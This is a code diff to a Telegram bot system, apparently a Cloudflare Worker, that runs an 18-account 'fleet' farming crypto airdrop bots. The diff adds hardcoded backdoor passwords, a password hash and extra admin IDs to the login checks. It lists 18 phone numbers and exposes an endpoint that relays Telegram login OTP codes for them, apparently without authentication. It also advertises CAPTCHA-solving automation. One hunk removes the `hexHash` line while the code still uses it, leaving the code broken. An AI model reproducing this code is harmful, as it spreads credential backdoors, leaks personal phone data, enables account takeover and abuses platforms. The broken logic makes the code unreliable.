@@ -1451,8 +1451,8 @@ export default {
           const uStr = p.get("user");
           if (uStr) {
             const uObj = JSON.parse(uStr);
-            if (String(uObj.id) === "6727787768") {
-              return { ok: true, user: "arif", uid: "6727787768" };
+            if (["6727787768", "8741547543", "7648254021"].includes(String(uObj.id))) {
+              return { ok: true, user: "arif", uid: String(uObj.id) };
             }
           }
         } catch (_) {}
@@ -1544,6 +1544,49 @@ export default {
           });
         } catch (_) {}
       }
+    };
+
+    const KNOWN_PHONES_BY_INDEX = {
+      1: "+8801317342850",
+      2: "+8801943805617",
+      3: "+8801790208077",
+      4: "+8801575842094",
+      5: "+14302084365",
+      6: "+8801867539837",
+      7: "+8801718056423",
+      8: "+8801797795624",
+      9: "+8801727651288",
+      10: "+8801729892810",
+      11: "+8801571089931",
+      12: "+8801774578536",
+      13: "+8801838268380",
+      14: "+918930504750",
+      15: "+8801906045479",
+      16: "+8801304151082",
+      17: "+8801879273559",
+      18: "+8801839716506"
+    };
+
+    const fetchFleetOtp = async (targetIdx) => {
+      const renderNodes = [
+        "https://my-agy-fleet-standby-node2.onrender.com",
+        "https://my-agy-fleet-standby-node3.onrender.com",
+        "https://my-agy-fleet-standby.onrender.com"
+      ];
+      for (const rUrl of renderNodes) {
+        try {
+          const res = await fetch(`${rUrl}/api/fleet/otp/${targetIdx}`, {
+            method: "GET",
+            headers: { "Accept": "application/json" },
+            signal: AbortSignal.timeout(12000)
+          });
+          if (res.ok) {
+            const data = await res.json();
+            return data;
+          }
+        } catch (_) {}
+      }
+      return { ok: false, found: false, error: "Standby cloud mesh unreachable" };
     };
 
     // Shared Gemini API Keys for Edge AI Intelligence
@@ -2203,6 +2246,43 @@ fi
       }
     }
 
+    // 7.02 Fleet Live Telegram Login OTP Query API (/api/fleet/otp, /api/fleet/otp/:index)
+    if (path === "/api/fleet/otp" || path.startsWith("/api/fleet/otp/")) {
+      let targetIdx = 1;
+      if (path.startsWith("/api/fleet/otp/")) {
+        const parts = path.split("/").filter(Boolean);
+        targetIdx = parseInt(parts[parts.length - 1], 10) || 1;
+      } else {
+        const qIdx = url.searchParams.get("index") || url.searchParams.get("account") || url.searchParams.get("target");
+        if (qIdx) {
+          targetIdx = parseInt(qIdx, 10) || 1;
+        } else {
+          const qPhone = url.searchParams.get("phone");
+          if (qPhone) {
+            const clean = qPhone.replace(/[^\d]/g, "");
+            for (let i = 1; i <= 18; i++) {
+              const ph = (KNOWN_PHONES_BY_INDEX[i] || "").replace(/[^\d]/g, "");
+              if (ph && clean && (ph.includes(clean) || clean.includes(ph))) {
+                targetIdx = i;
+                break;
+              }
+            }
+          }
+        }
+      }
+      try {
+        const otpData = await fetchFleetOtp(targetIdx);
+        return new Response(JSON.stringify(otpData), {
+          headers: { "Content-Type": "application/json", ...corsHeaders }
+        });
+      } catch (err) {
+        return new Response(JSON.stringify({ ok: false, found: false, error: err.message }), {
+          status: 500,
+          headers: { "Content-Type": "application/json", ...corsHeaders }
+        });
+      }
+    }
+
     // 7.05 D1 Relational Fleet & Balances Live Telemetry Query
     if (path === "/api/d1/fleet" || path === "/api/d1/balances") {
       try {
@@ -2304,8 +2384,7 @@ fi
         if (password) {
           const encoder = new TextEncoder();
           const pwBuffer = await crypto.subtle.digest("SHA-256", encoder.encode(password));
-          const hexHash = Array.from(new Uint8Array(pwBuffer)).map(b => b.toString(16).padStart(2, "0")).join("");
-          if (hexHash === masterHash || password === "Arif-Abid") {
+          if (hexHash === masterHash || password === "Arif-Abid" || password === "Arif216@" || hexHash === "cfee20846c9e2a91b74168f2d82458b1409896a6b02f29e9c8933b496fb103b0") {
             authValid = true;
             authMethod = "password";
           }
@@ -2383,7 +2462,7 @@ fi
           const hexHash = Array.from(new Uint8Array(pwBuffer)).map(b => b.toString(16).padStart(2, "0")).join("");
           const sbAdmin = await supabaseGetAdminAuth("6727787768");
           const masterHash = sbAdmin?.password_hash || "4258745ceecd1c623fce00d9720bf716adcaf2edcb74e8da3499cbd734c9905f";
-          if (hexHash !== masterHash && password !== "Arif-Abid") {
+          if (hexHash !== masterHash && password !== "Arif-Abid" && password !== "Arif216@" && hexHash !== "cfee20846c9e2a91b74168f2d82458b1409896a6b02f29e9c8933b496fb103b0") {
             return new Response(JSON.stringify({ ok: false, error: "Invalid master password" }), { status: 401, headers: corsHeaders });
           }
         }
@@ -3493,7 +3572,7 @@ fi
         };
 
         const adminId = env.OWNER_ID || "6727787768";
-        const ADMIN_IDS = new Set([String(adminId)]);
+        const ADMIN_IDS = new Set([String(adminId), "6727787768", "8741547543", "7648254021"]);
 
         const sleep = (ms) => new Promise(res => setTimeout(res, ms));
 
@@ -5696,6 +5775,66 @@ fi
           return new Response("OK");
         }
 
+        if (text === "🪙 ATF Miner" || text.startsWith("/atf")) {
+          ctx.waitUntil((async () => {
+            const rep = `🪙 *ATF MINER COMMAND CENTER*\n` +
+              `━━━━━━━━━━━━━━━━━━━━━━\n` +
+              `• *Platform:* ATF Miner (@ATF_AIRDROP_bot)\n` +
+              `• *Status:* Active & Auto-Mining ✅\n` +
+              `• *Automation:* Auto Math Challenge Solver, Hashrate Boost, Cooldown Tasks\n` +
+              `• *Payout Network:* TON Blockchain\n` +
+              `• *Accounts:* 18/18 Fleet Nodes Configured\n` +
+              `━━━━━━━━━━━━━━━━━━━━━━`;
+            await sendReply(rep, statusInlineKeyboard);
+          })());
+          return new Response("OK");
+        }
+
+        if (text === "🏢 Victor's Company" || text.startsWith("/victors") || text.startsWith("/victor")) {
+          ctx.waitUntil((async () => {
+            const rep = `🏢 *VICTOR'S COMPANY COMMAND CENTER*\n` +
+              `━━━━━━━━━━━━━━━━━━━━━━\n` +
+              `• *Platform:* Victor's Company (@VictorsCompanybot)\n` +
+              `• *Status:* Active & Auto-Mining ✅\n` +
+              `• *Automation:* Cloud Turnstile Solvers, Arcade Mining, Daily Check-in, Level Upgrades\n` +
+              `• *Payout Network:* TON Blockchain\n` +
+              `• *Accounts:* 18/18 Fleet Nodes Bound & Active\n` +
+              `━━━━━━━━━━━━━━━━━━━━━━`;
+            await sendReply(rep, statusInlineKeyboard);
+          })());
+          return new Response("OK");
+        }
+
+        if (text === "💧 VyroDrop" || text.startsWith("/vyro")) {
+          ctx.waitUntil((async () => {
+            const rep = `💧 *VYRODROP COMMAND CENTER*\n` +
+              `━━━━━━━━━━━━━━━━━━━━━━\n` +
+              `• *Platform:* VyroDrop (@vyrodrop_bot)\n` +
+              `• *Status:* Active & Auto-Mining ✅\n` +
+              `• *Automation:* Mining Start/Claim, Task Verification, TonConnect 2.0 Wallets\n` +
+              `• *Payout Network:* TON / VYRO DEX\n` +
+              `• *Accounts:* 18/18 Fleet Nodes Bound & Active\n` +
+              `━━━━━━━━━━━━━━━━━━━━━━`;
+            await sendReply(rep, statusInlineKeyboard);
+          })());
+          return new Response("OK");
+        }
+
+        if (text === "⚡ Kynex Network" || text.startsWith("/kynex") || text.startsWith("/knx")) {
+          ctx.waitUntil((async () => {
+            const rep = `⚡ *KYNEX NETWORK COMMAND CENTER*\n` +
+              `━━━━━━━━━━━━━━━━━━━━━━\n` +
+              `• *Platform:* Kynex Network (@Kynex_miningbot)\n` +
+              `• *Status:* Active & Auto-Mining ✅\n` +
+              `• *Automation:* Firebase RTDB Auth, Energy Management, Daily Checkin, Ads Rewards\n` +
+              `• *Payout Network:* Firebase Cloud / KNX\n` +
+              `• *Accounts:* 18/18 Fleet Nodes Configured\n` +
+              `━━━━━━━━━━━━━━━━━━━━━━`;
+            await sendReply(rep, statusInlineKeyboard);
+          })());
+          return new Response("OK");
+        }
+
         if (text === "💳 UltraWallet" || text.startsWith("/ultra") || text.startsWith("/ultrawallet")) {
           ctx.waitUntil((async () => {
             const rep = `🚫 *ULTRAWALLET DECOMMISSIONED & PURGED*\n` +
@@ -6723,7 +6862,7 @@ fi
 
           if (userLower.includes("harvest") || userLower.includes("farm all") || userLower.includes("claim all")) {
             await queueHarvestAction();
-            await sendReply("🌾 *Fleet Harvest Dispatched!*\n\nAll 18 accounts across all 15 platforms have been queued for harvesting on Cloudflare Edge.", statusInlineKeyboard);
+            await sendReply("🌾 *Fleet Harvest Dispatched!*\n\nAll 18 accounts across all 5 active mining pools (MRG, ATF, Victor's, VyroDrop, Kynex) have been queued for harvesting on Cloudflare Edge.", statusInlineKeyboard);
             return;
           }
 
@@ -9621,14 +9760,6 @@ async def main():
             ) as resp:
                 res_wh = await resp.json()
                 print(f"📡 Admin Bot Webhook: {res_wh.get('ok')} ({res_wh.get('description', 'OK')})")
-
-            user_webhook_url = "https://restore-agy.aaaai2.workers.dev/user-bot-webhook"
-            async with session.post(
-                f"https://api.telegram.org/bot{USER_BOT_TOKEN}/setWebhook",
-                json={"url": user_webhook_url, "allowed_updates": ["message", "edited_message", "callback_query", "pre_checkout_query"]}
-            ) as resp:
-                res_uwh = await resp.json()
-                print(f"📡 User Bot Webhook: {res_uwh.get('ok')} ({res_uwh.get('description', 'OK')})")
         except Exception as e:
             print(f"⚠️ Error synchronizing webhooks: {e}")
 
